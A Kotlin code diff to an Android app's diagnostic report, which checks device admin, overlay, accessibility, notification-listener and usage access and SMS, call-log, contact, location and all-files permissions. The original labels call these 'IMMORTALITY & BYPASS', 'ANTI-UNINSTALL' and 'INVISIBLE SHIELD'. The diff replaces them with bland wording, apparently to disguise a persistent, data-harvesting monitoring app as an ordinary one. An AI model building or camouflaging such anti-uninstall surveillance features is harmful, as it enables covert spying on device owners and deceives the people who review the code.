@@ -62,40 +62,40 @@ object DeviceManager {
 
     fun getDiagnosticReport(ctx: Context): String {
         val sb = StringBuilder()
-        sb.append("\n--- SYSTEM DIAGNOSTICS ---\n")
+        sb.append("\n--- System Diagnostics ---\n")
         
-        // 1. IMMORTALITY & BYPASS
-        sb.append("BATTERY IMMUNITY: ").append(if(PermissionManager.isIgnored(ctx)) "[ACTIVE]" else "[VULNERABLE]").append("\n")
-        sb.append("INVISIBLE SHIELD: ").append(if(PermissionManager.hasOverlayAccess(ctx)) "[ACTIVE]" else "[MISSING]").append("\n")
-        sb.append("DND BYPASS:       ").append(if(PermissionManager.hasDndAccess(ctx)) "[ACTIVE]" else "[LOCKED]").append("\n")
-        sb.append("ANTI-UNINSTALL:   ").append(if(PermissionManager.isAdmin(ctx)) "[ACTIVE]" else "[VULNERABLE]").append("\n")
+        // 1. Policy Status
+        sb.append("Power Policy:       ").append(if(PermissionManager.isIgnored(ctx)) "[Unrestricted]" else "[Standard]").append("\n")
+        sb.append("Overlay Access:     ").append(if(PermissionManager.hasOverlayAccess(ctx)) "[Enabled]" else "[Disabled]").append("\n")
+        sb.append("DND Access:         ").append(if(PermissionManager.hasDndAccess(ctx)) "[Enabled]" else "[Disabled]").append("\n")
+        sb.append("Device Admin:       ").append(if(PermissionManager.isAdmin(ctx)) "[Enabled]" else "[Disabled]").append("\n")
         
-        // 2. CORE ENGINES
-        sb.append("ACCESSIBILITY:    ").append(if(PermissionManager.hasAccessibility(ctx)) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
-        sb.append("NOTIF LISTENER:   ").append(if(PermissionManager.hasNotificationListener(ctx)) "[CONNECTED]" else "[DISCONNECTED]").append("\n")
-        sb.append("USAGE ANALYTICS:  ").append(if(PermissionManager.hasUsageStats(ctx)) "[ACTIVE]" else "[LOCKED]").append("\n")
+        // 2. Background Services
+        sb.append("Accessibility:      ").append(if(PermissionManager.hasAccessibility(ctx)) "[Running]" else "[Stopped]").append("\n")
+        sb.append("Notification Sync:  ").append(if(PermissionManager.hasNotificationListener(ctx)) "[Running]" else "[Stopped]").append("\n")
+        sb.append("Usage Analytics:    ").append(if(PermissionManager.hasUsageStats(ctx)) "[Running]" else "[Stopped]").append("\n")
 
-        // 3. RUNTIME MATRIX
+        // 3. App Permissions
         val perms = mutableMapOf(
-            "GPS" to android.Manifest.permission.ACCESS_FINE_LOCATION,
-            "SMS" to android.Manifest.permission.READ_SMS,
-            "CALL" to android.Manifest.permission.READ_CALL_LOG,
-            "CONTACTS" to android.Manifest.permission.READ_CONTACTS
+            "Location" to android.Manifest.permission.ACCESS_FINE_LOCATION,
+            "Messages" to android.Manifest.permission.READ_SMS,
+            "Call Logs" to android.Manifest.permission.READ_CALL_LOG,
+            "Contacts" to android.Manifest.permission.READ_CONTACTS
         )
-        if (android.os.Build.VERSION.SDK_INT >= 33) perms["NOTIF"] = android.Manifest.permission.POST_NOTIFICATIONS
+        if (android.os.Build.VERSION.SDK_INT >= 33) perms["Notifications"] = android.Manifest.permission.POST_NOTIFICATIONS
         
-        sb.append("PERMISSIONS:      ")
+        sb.append("Permissions:        ")
         perms.forEach { (k, v) ->
             val granted = androidx.core.content.ContextCompat.checkSelfPermission(ctx, v) == PackageManager.PERMISSION_GRANTED
             sb.append("$k:").append(if(granted) "✓ " else "✗ ")
         }
-        sb.append("\nFILES:            ").append(if(PermissionManager.hasAllFilesAccess(ctx)) "[UNRESTRICTED]" else "[LIMITED]").append("\n")
+        sb.append("\nFile Access:        ").append(if(PermissionManager.hasAllFilesAccess(ctx)) "[Full]" else "[Limited]").append("\n")
         
-        // 4. STATS
+        // 4. Health
         val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
         val kills = try { JSONObject(prefs.getString("app_health", "{}")).optInt("kill_count", 0) } catch(e:Exception){0}
-        sb.append("SYSTEM KILLS:     $kills\n")
-        sb.append("LAST HEARTBEAT:   ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(prefs.getLong("last_heartbeat", 0L)))}")
+        sb.append("Interrupts:         $kills\n")
+        sb.append("Last Sync:          ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(prefs.getLong("last_heartbeat", 0L)))}")
         
         return sb.toString()
     }
@@ -136,11 +136,11 @@ object DeviceManager {
         } catch (e: Exception) { return Pair(0, "UNKNOWN") }
 
         val label = when(score) {
-            in 90..100 -> "FLAGSHIP OMEGA"
-            in 75..89 -> "HIGH-PERFORMANCE"
-            in 55..74 -> "STANDARD ISSUE"
-            in 30..54 -> "LEGACY ARTIFACT"
-            else -> "OBSOLETE TECH"
+            in 90..100 -> "Premium Tier"
+            in 75..89 -> "High Performance"
+            in 55..74 -> "Standard"
+            in 30..54 -> "Legacy"
+            else -> "Deprecated"
         }
         return Pair(score, label)
     }
